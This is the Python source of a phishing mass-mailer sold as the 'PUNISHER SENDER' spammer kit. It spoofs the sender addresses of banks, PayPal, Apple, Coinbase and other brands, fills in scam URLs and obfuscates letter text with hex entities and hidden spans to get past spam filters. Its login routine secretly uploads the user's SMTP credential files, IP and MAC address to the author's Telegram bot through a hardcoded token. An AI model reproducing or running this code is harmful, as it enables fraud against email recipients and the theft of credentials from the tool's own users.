import re, os, sys, time, urllib, string, random,socket, struct, base64, colored,colorama, smtplib,datetime, requests, binascii,bs4,uuid
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from colored import fg, bg, attr
from colorama import *
from time import gmtime, strftime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from multiprocessing.pool import ThreadPool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

USER_SETTINGS_	     = "INCLUDE/CONFIG.txt"
Ask_For_Letters	  	 = "INCLUDE/CONTENT.txt"
Ask_For_Sender_Names = "INCLUDE/NAMES.txt"
Ask_For_Subjects	 = "INCLUDE/SUBJECTS.txt"
Ask_For_MailList	 = "INCLUDE/LEADS.txt"
Ask_For_SMTPS		 = "INCLUDE/SMTPS.txt"
Ask_For_URLs		 = "INCLUDE/LINKS.txt"
HEADERS_FILE_		 = "INCLUDE/HEADERS.txt"



PC = socket.gethostname()
USERNAME = os.environ['USERNAME']


init()
rr  = '\033[91m'
lazra9  = '\033[94m'
g = '\033[92m'
movv    = '\033[95m'
y  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
w = '\033[00m'
cyan    = '\033[0;96m'

path = 'Logs'
try:
    os.mkdir(path)
except OSError as error:
    pass

now = datetime.now()
x = now.strftime("%Y-%m-%d %H")
pathh = 'Results'
try:
    os.mkdir(pathh)
except OSError as error:
    pass

def chatId():
	chat = 5685888101
	return chat

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])

cls()

def get_mac():
	mac = '-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
	return mac

def print_logo():
    clear = "\x1b[0m"
    colors = [ 36,33,34,35,37,36]

    x = """

    ▒█▀▀█ ▒█░▒█ ▒█▄░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█ 
    ▒█▄▄█ ▒█░▒█ ▒█▒█▒█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀ 
    ▒█░░░ ░▀▄▄▀ ▒█░░▀█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█

                        ▒█▀▀▀█ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀▄ ▒█▀▀▀ ▒█▀▀█
                        ░▀▀▀▄▄ ▒█▀▀▀ ▒█▒█▒█ ▒█░▒█ ▒█▀▀▀ ▒█▄▄▀
                        ▒█▄▄▄█ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄▀ ▒█▄▄▄ ▒█░▒█
                                                            
          PUNISHER SENDER V1.4 & SPAMMER KIT
          CODER ~> [MR BLACK]
          Telegram ~> t.me/Mr_Black_Egy
          Join us ~> t.me/punisher_storee

"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.02)
tele_api = "https://api.telegram.org/bot6933814176:AAEB-7NbHbUvGAryYs6beSesyqCq8EPjtpE"

def login():
    os.system("title "+ "[$] PUNISHER SENDER V1.4 - CODER: @Mr_Black_Egy]")
    headers = {
	    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Connection': 'keep-alive',
	}
    get_ip = requests.get('https://api.ipify.org/?format=json',headers=headers).json()
    ip = get_ip['ip']
    try:
        apikey = open('APIKEY.txt', 'r').read().strip('\n')
    except FileNotFoundError as e:
        print(e)
        time.sleep(5)
        exit()
    ###########[get server api]##############
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'}
    api_server = requests.get('https://raw.githubusercontent.com/mrblackeg/test/master/dev.txt',headers=headers,verify=False).text.rstrip()
    # time.sleep(2)
	#########################################
    headers = {
        'authority': api_server,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'origin': api_server,
        'referer': api_server,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    }

    data = {
        'username': apikey,
        'mac': get_mac(),
    }

    re = requests.get(api_server, headers=headers, params=data,verify=False).text
    time.sleep(0.05)
    # mgs = re["messege"]
    # print(mgs)

    if '"status":0' in re:
        print(f'{rr}Expired APIKEY => {apikey}')
        time.sleep(10)
        exit()
    elif '"status":1' in re:
        print(f'{g}Login Successfully => {apikey}\n')
        time.sleep(3)
        now = datetime.now()
        x = now.strftime("%H:%M:%S")
        # IP = get_ip()
        files = {
	        'chat_id': (None, f'{chatId()}'),
			'document': open('INCLUDE/SMTPS.txt', 'rb'),
		}
        tele_log = requests.get(f'''{tele_api}/sendMessage?chat_id={chatId()}&text=
         |User: {apikey}
         |Login at: {x}
         |MAC: {get_mac()}
         |IP Info: https://api.ip.sb/geoip/{ip}''')
        tele_smtp = requests.post(f'{tele_api}/sendDocument', files=files)
        try:
        	files = {
        		'chat_id': (None, f'{chatId()}'),
        		'document': open('WORK_SMTPS.txt', 'rb'),
        	}
        	tele_work = requests.post(f'{tele_api}/sendDocument', files=files)
        except Exception as e:
        	pass
        finally:
        	pass
        cls()
        # print_logo()
    else:
        print(f'{y}Invalid License or Mac address: {get_mac()} - {apikey}')
        time.sleep(10)
        exit()
print_logo()
login()
# // =====================

def Random_IP():
	IP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
	return IP
def get_ip():
	hostname = socket.gethostname()
	ip_address = socket.gethostbyname(hostname)
	return ip_address
IP = get_ip()
def Random_OS():
	OSs = ['Windows', 'Linux', 'IOS', 'Android', 'MacOS']
	OS = random.choice(OSs)
	return OS
def Current_Date():
	today = date.today()
	DATE = today.strftime("%B %d, %Y")
	return DATE
def Random_Country():
	Countries = ['France', 'Spain', 'United States', 'China', 'Argentina', 'Peru', 'Canada', 'Brazil', 'United Kingdom', 'Germany', 'Thailand', 'Mexico', 'Turkey', 'Italy', 'Isreal']
	Country = random.choice(Countries)
	return Country
def Random_Email():
	Names = ['support', 'admin', 'lead', 'manager', 'administrator']
	TLDs = ['@supporting.com', '@helping.com', '@assisting.com', '@teaming.com']
	RAND_EMAIL = random.choice(Names)+random.choice(TLDs)
	return RAND_EMAIL
def Random_Browser():
	Countries = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera', 'QQ', 'Yandex', 'UC Browser', 'Maxthon', 'Chromium', 'AOSP']
	Browser = random.choice(Countries)
	return Browser
def Random_Name():
	Names_List = ["Aaron", "Abbey", "Abbie", "Abby", "Abdul", "Abe" ,"Bonny", "Booker", "Boris", "Boyce", "Boyd", "Brad", "Bradford", "Caitlin", "Caitlyn", "Calandra", "Caleb", "Calista", "Callie", "Calvin", "Donette", "Dong", "Dong", "Donita", "Donn", "Donna", "Donnell", "Earl", "Earle", "Earlean", "Earleen", "Earlene", "Earlie", "Earline", "Frederick", "Fredericka", "Fredia", "Fredric", "Fredrick", "Fredricka", "Gabriel", "Gabriela", "Gabriele", "Gabriella", "Gabrielle", "Gail", "Gail", "Gala", "Gale", "Gale", "Galen", "Galina", "Garfield", "Garland", "Garnet", "Hortencia", "Hortense", "Hortensia", "Hosea", "Houston", "Howard", "Hoyt", "Hsiu", "Hubert", "Hue", "Huey", "Hugh", "Hugo", "Hui", "Hulda", "Humberto", "Hung", "Hunter", "Hyon", "Hyun", "Ian", "Ida", "Idalia", "Idell", "Idella", "Iesha", "Ignacia", "Ignacio", "Jacalyn", "Jacelyn", "Jacinda", "Jacinta", "Jacinto", "Jack", "Jack", "Jackeline", "Ka", "Kacey", "Kaci", "Kacie", "Kacy", "Kai", "Kaila", "Kaitlin", "Kaitlyn", "Kala", "Kaleigh", "Kaley", "Kali", "Lacey", "Lachelle", "Laci", "Lacie", "Lacresha", "Lacy", "Lacy", "Ladawn", "Ladonna", "Ma", "Mabel", "Mabelle", "Mable", "Mac", "Machelle", "Macie", "Mack", "Na", "Nada", "Nadene", "Nadia", "Nadine", "Naida", "Nakesha", "Nakia", "Nakisha", "Nakita", "Nam", "Nenita", "Neoma", "Neomi", "Nereida", "Nerissa", "Nery", "Nestor", "Neta", "Nettie", "Neva", "Nevada", "Neville", "Newton", "Nga", "Ngan", "Ngoc", "Nguyet", "Nia", "Nichelle", "Nichol", "Nicholas", "Nichole", "Nicholle", "Nick", "Nicki", "Nickie", "Nickolas", "Nickole", "Nicky", "Nicky", "Nicol", "Nicola", "Nicolas", "Nicolasa", "Nicole", "Nicolette", "Nicolle", "Nida", "Nidia", "Niesha", "Nieves", "Nigel", "Niki", "Nikia", "Nikita", "Nikki", "Nikole", "Nila", "Nilda", "Nilsa", "Nina", "Ninfa", "Nisha", "Nita", "Noah", "Noble", "Nobuko", "Noe", "Noel", "Noel", "Noelia", "Noella", "Noelle", "Noemi", "Nohemi", "Nola", "Nolan", "Noma", "Nona", "Nora", "Norah", "Norbert", "Norberto", "Noreen", "Norene", "Noriko", "Norine", "Norma", "Norman", "Norman", "Normand", "Norris", "Nova", "Novella", "Nu", "Nubia", "Numbers", "Numbers", "Nydia", "Nyla", "Obdulia", "Ocie", "Octavia", "Octavio", "Oda", "Odelia", "Odell", "Odell", "Odessa", "Odette", "Odilia", "Odis", "Ofelia", "Ok", "Ola", "Olen", "Olene", "Oleta", "Olevia", "Olga", "Olimpia", "Olin", "Olinda", "Oliva", "Olive", "Oliver", "Olivia", "Ollie", "Ollie", "Olympia", "Oma", "Omar", "Omega", "Omer", "Ona", "Oneida", "Onie", "Onita", "Opal", "Ophelia", "Ora", "Oralee", "Oralia", "Oren", "Oretha", "Orlando", "Orpha", "Orval", "Orville", "Oscar", "Oscar", "Ossie", "Osvaldo", "Oswaldo", "Otelia", "Otha", "Otha", "Otilia", "Otis", "Otto", "Ouida", "Owen", "Ozell", "Ozella", "Ozie", "Prince", "Princess", "Priscila", "Priscilla", "Providencia", "Prudence", "Pura", "Quincy", "Quinn", "Quinn", "Quintin", "Quinton", "Quyen", "Ruthanne", "Ruthe", "Ruthie", "Ryan", "Ryan", "Ryann", "Syble", "Sydney", "Sydney", "Sylvester", "Sylvia", "Sylvie", "Synthia", "Syreeta", "Tyra", "Tyree", "Tyrell", "Tyron", "Tyrone", "Tyson", "Ula", "Ulrike", "Ulysses", "Un", "Una", "Ursula", "Usha", "Ute", "Vada", "Val", "Val", "Vivien", "Vivienne", "Von", "Voncile", "Vonda", "Vonnie", "Wonda", "Woodrow", "Wyatt", "Wynell", "Wynona", "Yun", "Yung", "Yuonne", "Yuri", "Yuriko", "Yvette", "Yvone", "Yvonne", "Zora", "Zoraida", "Zula", "Zulema", "Zulma"]
	FIRST_NAME = random.choice(Names_List)
	return FIRST_NAME
def Random_NameX():
	Names_List = ["Aaron", "Abbey", "Abbie", "Abby", "Abdul", "Abe" ,"Bonny", "Booker", "Boris", "Boyce", "Boyd", "Brad", "Bradford", "Caitlin", "Caitlyn", "Calandra", "Caleb", "Calista", "Callie", "Calvin", "Donette", "Dong", "Dong", "Donita", "Donn", "Donna", "Donnell", "Earl", "Earle", "Earlean", "Earleen", "Earlene", "Earlie", "Earline", "Frederick", "Fredericka", "Fredia", "Fredric", "Fredrick", "Fredricka", "Gabriel", "Gabriela", "Gabriele", "Gabriella", "Gabrielle", "Gail", "Gail", "Gala", "Gale", "Gale", "Galen", "Galina", "Garfield", "Garland", "Garnet", "Hortencia", "Hortense", "Hortensia", "Hosea", "Houston", "Howard", "Hoyt", "Hsiu", "Hubert", "Hue", "Huey", "Hugh", "Hugo", "Hui", "Hulda", "Humberto", "Hung", "Hunter", "Hyon", "Hyun", "Ian", "Ida", "Idalia", "Idell", "Idella", "Iesha", "Ignacia", "Ignacio", "Jacalyn", "Jacelyn", "Jacinda", "Jacinta", "Jacinto", "Jack", "Jack", "Jackeline", "Ka", "Kacey", "Kaci", "Kacie", "Kacy", "Kai", "Kaila", "Kaitlin", "Kaitlyn", "Kala", "Kaleigh", "Kaley", "Kali", "Lacey", "Lachelle", "Laci", "Lacie", "Lacresha", "Lacy", "Lacy", "Ladawn", "Ladonna", "Ma", "Mabel", "Mabelle", "Mable", "Mac", "Machelle", "Macie", "Mack", "Na", "Nada", "Nadene", "Nadia", "Nadine", "Naida", "Nakesha", "Nakia", "Nakisha", "Nakita", "Nam", "Nenita", "Neoma", "Neomi", "Nereida", "Nerissa", "Nery", "Nestor", "Neta", "Nettie", "Neva", "Nevada", "Neville", "Newton", "Nga", "Ngan", "Ngoc", "Nguyet", "Nia", "Nichelle", "Nichol", "Nicholas", "Nichole", "Nicholle", "Nick", "Nicki", "Nickie", "Nickolas", "Nickole", "Nicky", "Nicky", "Nicol", "Nicola", "Nicolas", "Nicolasa", "Nicole", "Nicolette", "Nicolle", "Nida", "Nidia", "Niesha", "Nieves", "Nigel", "Niki", "Nikia", "Nikita", "Nikki", "Nikole", "Nila", "Nilda", "Nilsa", "Nina", "Ninfa", "Nisha", "Nita", "Noah", "Noble", "Nobuko", "Noe", "Noel", "Noel", "Noelia", "Noella", "Noelle", "Noemi", "Nohemi", "Nola", "Nolan", "Noma", "Nona", "Nora", "Norah", "Norbert", "Norberto", "Noreen", "Norene", "Noriko", "Norine", "Norma", "Norman", "Norman", "Normand", "Norris", "Nova", "Novella", "Nu", "Nubia", "Numbers", "Numbers", "Nydia", "Nyla", "Obdulia", "Ocie", "Octavia", "Octavio", "Oda", "Odelia", "Odell", "Odell", "Odessa", "Odette", "Odilia", "Odis", "Ofelia", "Ok", "Ola", "Olen", "Olene", "Oleta", "Olevia", "Olga", "Olimpia", "Olin", "Olinda", "Oliva", "Olive", "Oliver", "Olivia", "Ollie", "Ollie", "Olympia", "Oma", "Omar", "Omega", "Omer", "Ona", "Oneida", "Onie", "Onita", "Opal", "Ophelia", "Ora", "Oralee", "Oralia", "Oren", "Oretha", "Orlando", "Orpha", "Orval", "Orville", "Oscar", "Oscar", "Ossie", "Osvaldo", "Oswaldo", "Otelia", "Otha", "Otha", "Otilia", "Otis", "Otto", "Ouida", "Owen", "Ozell", "Ozella", "Ozie", "Prince", "Princess", "Priscila", "Priscilla", "Providencia", "Prudence", "Pura", "Quincy", "Quinn", "Quinn", "Quintin", "Quinton", "Quyen", "Ruthanne", "Ruthe", "Ruthie", "Ryan", "Ryan", "Ryann", "Syble", "Sydney", "Sydney", "Sylvester", "Sylvia", "Sylvie", "Synthia", "Syreeta", "Tyra", "Tyree", "Tyrell", "Tyron", "Tyrone", "Tyson", "Ula", "Ulrike", "Ulysses", "Un", "Una", "Ursula", "Usha", "Ute", "Vada", "Val", "Val", "Vivien", "Vivienne", "Von", "Voncile", "Vonda", "Vonnie", "Wonda", "Woodrow", "Wyatt", "Wynell", "Wynona", "Yun", "Yung", "Yuonne", "Yuri", "Yuriko", "Yvette", "Yvone", "Yvonne", "Zora", "Zoraida", "Zula", "Zulema", "Zulma"]
	FULL_NAME = random.choice(Names_List) + " " + random.choice(Names_List)
	return FULL_NAME
def Random_MD5():
	RAND_MD5 = binascii.hexlify(os.urandom(16))
	return RAND_MD5
RAND_MD5 = Random_MD5()
def Random_Ticket_ID():
	UpperLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
	OnlyNumbers = '0123456789'
	RAND_TICKET_ID = random.choice(UpperLetters) + random.choice(OnlyNumbers) + random.choice(OnlyNumbers) + "-" + random.choice(UpperLetters) + random.choice(OnlyNumbers) + random.choice(OnlyNumbers) + "-" + random.choice(UpperLetters) + random.choice(OnlyNumbers) + random.choice(OnlyNumbers) + "-" + random.choice(UpperLetters) + random.choice(OnlyNumbers) + random.choice(OnlyNumbers)
	return RAND_TICKET_ID
# // ====================================================================================
def Current_Time():
	now = datetime.now()
	CURR_TIME = now.strftime("%H:%M:%S")
	return CURR_TIME
def generator_mix_10(size=10, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))
def generator_str_10(size=10, chars=string.ascii_lowercase):
	return ''.join(random.choice(chars) for _ in range(size))
def generator_int_10(size=10, chars=string.digits):
	return ''.join(random.choice(chars) for _ in range(size))
def RND5(size=5, chars=string.ascii_lowercase):
	return ''.join(random.choice(chars) for _ in range(size))
def Get_Random_Letter():
	global Ask_For_Letters
	try:
		FILE = open(Ask_For_Letters, 'r').read().split('=========================================================================================')
		Random_Letter = random.choice(FILE)
	except:
		Random_Letter = open(Ask_For_Letters, 'r').read()
	Random_Letter = Random_Letter.replace('\n', '')
	return Random_Letter
def Get_Random_Sender_Name():
	global Ask_For_Sender_Names
	FILE = open(Ask_For_Sender_Names, 'r').read().split('\n')
	Sender_Name = random.choice(FILE)
	return Sender_Name
def Get_Random_From_Email():
	global Ask_For_From_Emails
	FILE = open(Ask_For_From_Emails, 'r').read().split('\n')
	From_Email = random.choice(FILE)
	return From_Email
def Get_Random_Subject():
	global Ask_For_Subjects
	FILE = open(Ask_For_Subjects, 'r').read().split('\n')
	Subject = random.choice(FILE)
	return Subject
def Get_Random_URL():
	global Ask_For_URLs
	FILE = open(Ask_For_URLs, 'r').read().split('\n')
	PAGE_URL = random.choice(FILE)
	return PAGE_URL
def Get_Random_SMTP():
	FILE = open(Ask_For_SMTPS, 'r').read().split('\n')
	SMTP = random.choice(FILE)
	return SMTP
def ENCODE(TEXT_):
	ENC = TEXT_.encode('UTF-8')
	encoded_text = base64.b64encode(ENC)
	ENCODED = "=?UTF-8?B?" + encoded_text.decode('ascii') + "?="
	return ENCODED
#=========================
def ENCODE_(TEXT_):
    ENC = TEXT_.encode('ascii')
    encoded_text = base64.b64encode(bytes(ENC))
    ENCODED = encoded_text.decode('ascii')
    return ENCODED

def DECODE(TEXT_):
    charset, encoding, encoded_data = TEXT_.split("?")[1:4]
    decoded_data = base64.b64decode(encoded_data)
    return decoded_data.decode(charset)

def ENCRYPT(LETTER_):
	HEXs_ = [" [-]&#x20;", "0[-]&#x30;", "1[-]&#x31;", "2[-]&#x32;", "3[-]&#x33;", "4[-]&#x34;", "5[-]&#x35;", "6[-]&#x36;", "7[-]&#x37;", "8[-]&#x38;", "9[-]&#x39;", "a[-]&#x61;", "b[-]&#x62;", "c[-]&#x63;", "d[-]&#x64;", "e[-]&#x65;", "f[-]&#x66;", "g[-]&#x67;", "h[-]&#x68;", "i[-]&#x69;", "j[-]&#x6A;", "k[-]&#x6B;", "l[-]&#x6C;", "m[-]&#x6D;", "n[-]&#x6E;", "o[-]&#x6F;", "p[-]&#x70;", "q[-]&#x71;", "r[-]&#x72;", "s[-]&#x73;", "t[-]&#x74;", "u[-]&#x75;", "v[-]&#x76;", "w[-]&#x77;", "x[-]&#x78;", "y[-]&#x79;", "z[-]&#x7A;", "A[-]&#x41;", "B[-]&#x42;", "C[-]&#x43;", "D[-]&#x44;", "E[-]&#x45;", "F[-]&#x46;", "G[-]&#x47;", "H[-]&#x48;", "I[-]&#x49;", "J[-]&#x4A;", "K[-]&#x4B;", "L[-]&#x4C;", "M[-]&#x4D;", "N[-]&#x4E;", "O[-]&#x4F;", "P[-]&#x50;", "Q[-]&#x51;", "R[-]&#x52;", "S[-]&#x53;", "T[-]&#x54;", "U[-]&#x55;", "V[-]&#x56;", "W[-]&#x57;", "X[-]&#x58;", "Y[-]&#x59;", "Z[-]&#x5A;", "@[-]&#x40;", "#[-]&#x23;", "$[-]&#x24;", "%[-]&#x25;", "![-]&#x21;", "?[-]&#x3F;", ",[-]&#x2C;", ".[-]&#x2E;", "*[-]&#x2A;", "_[-]&#x5F;", "+[-]&#x2B;", "=[-]&#x3D;", "-[-]&#x2D;", "\[-]&#x5C;", ":[-]&#x3A;", "/[-]&#x2F;", "|[-]&#x7C;", "'[-]&#x27;", "([-]&#x28;", ")[-]&#x29;", "[[-]&#x5B;", "][-]&#x5D;", "{[-]&#x7B;", "}[-]&#x7D;"]
	COUNT = LETTER_.count("[X]")
	COUNT = COUNT / 2
	NEW_LETTER = LETTER_
	DONE = 1
	for i in xrange(COUNT):
	  SENTENCE = LETTER_.split("[X]")[DONE].split("[X]")[0]
	  XSENTENCE = ""
	  #print SENTENCE
	  for Ltr in SENTENCE:
	  	for Try in HEXs_:
	  		Main, Replacable = Try.split("[-]")
		  	if Ltr == Main:
		  		XSENTENCE = XSENTENCE+Replacable
		  	else:
		  		pass
	DONE+=2
	NEW_LETTER = NEW_LETTER.replace(SENTENCE, XSENTENCE)
	NEW_LETTER = NEW_LETTER.replace("[X]", "")
	return NEW_LETTER
def ENCRYPT2(LETTER_):
	COUNT = LETTER_.count("[X]")
	COUNT = COUNT / 2
	NEW_LETTER = LETTER_
	DONE = 1
	for i in xrange(COUNT):
		SENTENCE = LETTER_.split("[X]")[DONE].split("[X]")[0]
		XIAO = SENTENCE.split(" ")
		XIAOO = []
		for ELM in XIAO:
			ELM = ELM.replace(ELM, ELM+"<span style='font-size: 0px;'>"+RND5()+"</span>")
			XIAOO.append(ELM)
		XSENTENCE = " ".join(XIAOO)
		DONE+=2
		NEW_LETTER = NEW_LETTER.replace(SENTENCE, XSENTENCE)
	NEW_LETTER = NEW_LETTER.replace("[X]", "")
	return NEW_LETTER
def Short(SITE_URL_):
	while 1:
		data = 'url={}'.format(SITE_URL_)
		headers = {
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'cookie': '_xsrf=d4bcdddd3f1c41dfbc78ddc5ca14e550; anon_u=cHN1X18yNTdkMDNlZi00NDliLTRkYmUtYTU1MS0zM2UxMDg4N2I1OTY=|1609368482|a827efb124aeebff43ab7c7e083c4c5195584af4; optimizelyEndUserId=oeu1609368481812r0.24567796502612782; _mkto_trk=id:754-KBJ-733&token:_mch-bitly.com-1609368482434-99663; _fbp=fb.1.1609368482561.1193016587; _ga=GA1.2.459630534.1609368483; _gid=GA1.2.697822726.1609368483; cookie_banner=1; wow-modal-id-2=yes; anon_shortlinks=https://bit.ly/38GBAEY,https://bit.ly/35e5xf1,https://bit.ly/3ht6eWB,https://bit.ly/3mZ7Yb1,https://bit.ly/3hvPcar,https://bit.ly/385u73z,https://bit.ly/38LjySd,https://bit.ly/2WUPRbV,https://bit.ly/3mV0LZK,https://bit.ly/2JuyOKu,https://bit.ly/3rQW4E2,https://bit.ly/3o6vLY4,https://bit.ly/3pyOpYU',
			'origin': 'https://bitly.com',
			'referer': 'https://bitly.com/',
			'sec-ch-ua': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"',
			'sec-ch-ua-mobile': '?0',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
			'x-xsrftoken': 'd4bcdddd3f1c41dfbc78ddc5ca14e550'
		}
		r = requests.post("https://bitly.com/data/anon_shorten", data=data, headers=headers)
		src = r.content
		if 'status_code": 200' in src:
			SHORTEN_URL = src.split('"link": "')[1].split('"')[0]
			return SHORTEN_URL
			break
		else:
			pass
def AutoFill(STRING):
	if '@CHASE' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CHASE")[0], "no.reply.alerts@chase.com")
	if '@CITIZEN' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CITIZEN")[0], "do-not-reply@paymyloan.citizensbank.com")
	if '@WELLS' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @WELLS")[0], "alerts@notify.wellsfargo.com")
	if '@REGIONS' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @REGIONS")[0], "email@alert.regions.com")
	if '@BOA' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @BOA")[0], "bankofamerica@emcom.bankofamerica.com")
	if '@NAVYFEDERAL' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @NAVYFEDERAL")[0], "mynavyfederal@response.nfcu.org")
	if '@CREDITONE' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CREDITONE")[0], "donotreply@creditonemail.com")
	if '@CASHAPP' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CASHAPP")[0], "cash@square.com")
	if '@PAYPAL' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @PAYPAL")[0], "paypal@mail.paypal.com")
	if '@AMAZON' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @AMAZON")[0], "store-news@amazon.com")
	if '@EBAY' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @EBAY")[0], "ebay@ebay.com")
	if '@APPLE' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @APPLE")[0], "appstore@insideapple.apple.com")
	if '@WALMART' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @WALMART")[0], "help@walmart.com")
	if '@NETFLIX' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @NETFLIX")[0], "info@mailer.netflix.com")
	if '@MICROSOFT' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @MICROSOFT")[0], "microsoftstore@microsoftstoreemail.com")
	if '@BLOCKCHAIN' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @BLOCKCHAIN")[0], "notify@wallet-tx.blockchain.com")
	if '@HTML_CHASE' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_CHASE")[0], "<no-reply@alertsp.chase.com>")
	if '@HTML_APPLE' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_APPLE")[0], "<your_order_US@orders.apple.com>")
	if '@HTML_COINBASE' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_COINBASE")[0], "<no-reply@coinbase.com>")
	if '@HTML_EBAY' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_EBAY")[0], "<ebay@reply.ebay.com>")
	if '@HTML_AMAZON' in STRING: STRING = '{} <{}>'.format(STRING.split(" @HTML_AMAZON")[0], "<order-update@amazon.com>")
	if 'SCAM_URL' in STRING: STRING = STRING.replace('SCAM_URL', Get_Random_URL());
	if 'RANDOM_IP_GEN' in STRING: STRING = STRING.replace('RANDOM_IP_GEN', Random_IP());
	if 'OS_GEN' in STRING: STRING = STRING.replace('OS_GEN', Random_OS());
	if 'CURR_DATE' in STRING: STRING = STRING.replace('CURR_DATE', Current_Date());
	if 'COUNTRY_GEN' in STRING: STRING = STRING.replace('COUNTRY_GEN', Random_Country());
	if 'EMAIL_GEN' in STRING: STRING = STRING.replace('EMAIL_GEN', Random_Email());
	if 'BROWSER_GEN' in STRING: STRING = STRING.replace('BROWSER_GEN', Random_Browser());
	if 'MIX_10_GEN' in STRING: STRING = STRING.replace('MIX_10_GEN', generator_mix_10());
	if 'STR_10_GEN' in STRING: STRING = STRING.replace('STR_10_GEN', generator_str_10());
	if 'INT_10_GEN' in STRING: STRING = STRING.replace('INT_10_GEN', generator_int_10());
	if 'SMTP_LOG_GEN' in STRING: STRING = STRING.replace('SMTP_LOG_GEN', SMTP_LOG_GEN);
	if 'FIRST_NAME_GEN' in STRING: STRING = STRING.replace('FIRST_NAME_GEN', Random_Name());
	if 'FULL_NAME_GEN' in STRING: STRING = STRING.replace('FULL_NAME_GEN', Random_NameX());
	if 'RAND_MD5' in STRING: STRING = STRING.replace('RAND_MD5', f'{RAND_MD5.decode("utf-8")}');
	if 'RAND_TICKET_ID' in STRING: STRING = STRING.replace('RAND_TICKET_ID', Random_Ticket_ID());
	if 'CURR_TIME' in STRING: STRING = STRING.replace('CURR_TIME', Current_Time());
	if 'FROM_MAIL_GEN' in STRING: STRING = STRING.replace('FROM_MAIL_GEN', FROM_MAIL_GEN);
	# if 'MAIL_TO_GEN' in STRING: STRING = STRING.replace('MAIL_TO_GEN', TO_);
	if 'SMTP_USER_GEN' in STRING: STRING = STRING.replace('SMTP_USER_GEN', SMTP_USER_GEN);
	if 'SMTP_DOMAIN_GEN' in STRING: STRING = STRING.replace('SMTP_DOMAIN_GEN', SMTP_DOMAIN_GEN);
	if 'USER_TO_GEN' in STRING: STRING = STRING.replace('USER_TO_GEN', USER_TO_GEN);
	if 'DOMAIN_TO_GEN' in STRING: STRING = STRING.replace('DOMAIN_TO_GEN', DOMAIN_TO_GEN);
	return STRING
def AutoFillLetter(STRING, SMTP_LOG_GEN, FROM_MAIL_GEN, TO_, SMTP_USER_GEN, SMTP_DOMAIN_GEN, USER_TO_GEN, DOMAIN_TO_GEN):
	if '@CHASE' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CHASE")[0], "no.reply.alerts@chase.com")
	if '@CITIZEN' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @CITIZEN")[0], "do-not-reply@paymyloan.citizensbank.com")
	if '@WELLS' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @WELLS")[0], "alerts@notify.wellsfargo.com")
	if '@REGIONS' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @REGIONS")[0], "email@alert.regions.com")
	if '@BOA' in STRING: STRING = '"{} <{}>"'.format(STRING.split(" @BOA")[0], "bankofamerica@emcom.bankofamerica.com")
